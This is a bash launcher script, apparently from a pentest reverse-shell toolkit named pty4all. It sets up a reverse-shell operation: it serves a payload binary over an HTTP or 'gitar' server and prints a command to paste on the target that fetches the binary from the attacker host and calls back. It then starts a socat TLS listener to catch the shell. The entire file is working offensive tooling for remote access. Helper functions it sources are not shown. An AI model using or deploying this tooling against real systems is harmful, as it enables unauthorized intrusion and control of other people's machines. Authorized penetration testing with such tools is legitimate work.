#!/bin/bash

# From https://github.com/laluka/pty4all
SHORTCUT=true

for i in "$@"; do
    case $i in
    --lport|-p)
        LPORT="$2"
        shift;shift;
        ;;
    --lhost)
        LHOST="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;
    --gitar|-g)
        GITAR=true
        ;;
    --windows|-w)
        WINDOWS=true
        ;;
    --tmp)
        TACOS_IN_TMP=true
        ;;
    --no-shortcuts|-N)
        SHORTCUT=""
        ;;
    *)
        ;;
    esac
done

SCRIPTNAME=$(readlink -f "$0")
BASEDIR=$(dirname "$SCRIPTNAME")
source "${BASEDIR}/socat-common.sh"

if [[ -z "$WEBPORT" ]]; then
    WEBPORT=8080
fi

if [[ -z "$LHOST" ]] || [[ -z "$LPORT" ]]; then
    echo "Usage : $0 --lhost <LHOST> --lport <LPORT> --webport <WEB_PORT>"
    echo "To preload gitar shortcuts within reverse shell: $0 --lhost <LHOST> --lport <LPORT> --gitar"
    exit 92
fi

check_tmux
set_binary_and_script "$BASEDIR" "$WINDOWS"
generate_tls_certs

cp ${SCRIPT}.tpl ${SCRIPT}

# HTTP server launch
if [[ "$GITAR" ]]; then
    echo "[+] launch gitar server"
    SECRET=$RANDOM
    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret ${SECRET}"
    if [[ ! $WINDOWS ]]; then
        echo "[+] gitar shortcuts enabled on reverse shell"
        sed -i "s/GITAR_SECRET/${SECRET}/g" ${SCRIPT}
        sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
        sed -i "s/GITAR_HOST/${LHOST}/g" ${SCRIPT}
    fi
else
    echo "[+] gitar shortcuts not enabled"
    tmux split-window -h "python3 -m http.server ${WEBPORT}"
    sed -i "/GITAR_SECRET/d" ${SCRIPT}
fi

check_tacos_present "$BINARY"

# Build download URL
DOWNLOAD_URL=""
if [[ "$GITAR" ]]; then
    DOWNLOAD_URL="http://${LHOST}:${WEBPORT}/${SECRET}/pull/${BINARY}"
else
    DOWNLOAD_URL="${LHOST}:${WEBPORT}/${BINARY}"
fi

echo "[*] Copy/paste following command on target and enjoy your meal:"
REMOTE_CMD=$(build_remote_cmd "$DOWNLOAD_URL" "$BINARY" "${LHOST}:${LPORT}" "$WINDOWS" "$TACOS_IN_TMP" "")

if [[ "$SHORTCUT" ]]; then
    SHORTCUT_URL="http://${LHOST}:${WEBPORT}"
    if [[ "$GITAR" ]]; then
        SHORTCUT_URL="${SHORTCUT_URL}/${SECRET}/pull/sh"
    else
        SHORTCUT_URL="${SHORTCUT_URL}/sh"
    fi
    REMOTE_CMD=$(apply_shortcut "$REMOTE_CMD" "$SHORTCUT_URL")
fi

echo
if [[ "$WINDOWS" ]]; then
    echo -e "(W) ${REMOTE_CMD}"
else
    echo -e "(L) ${REMOTE_CMD}"
fi

start_socat_listener "$LPORT" "$SCRIPT" "$WINDOWS"
